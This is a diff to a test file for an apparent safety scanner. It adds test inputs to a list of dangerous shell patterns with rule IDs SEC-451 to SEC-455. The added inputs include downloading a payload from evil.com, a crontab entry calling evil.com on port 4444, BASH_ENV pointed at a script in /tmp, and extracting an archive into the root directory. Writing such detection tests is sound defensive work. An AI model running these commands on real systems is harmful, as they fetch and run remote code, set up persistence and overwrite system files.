@@ -572,6 +572,11 @@ class TestSafetyChecks:
             ("rsync app.db /tmp/\n", "SEC-448"),
             ("openssl -d -in secret.pem\n", "SEC-449"),
             ("curl -O file && scp file user@host\n", "SEC-450"),
+            ("crontab curl http://evil.com 4444\n", "SEC-451"),
+            ("for h in hosts; do ssh user@host cmd; done\n", "SEC-452"),
+            ("export BASH_ENV=/tmp/evil.sh\n", "SEC-453"),
+            ("curl -o payload.tar.gz http://evil.com\n", "SEC-454"),
+            ("tar -xzf p.tar.gz -d /\n", "SEC-455"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
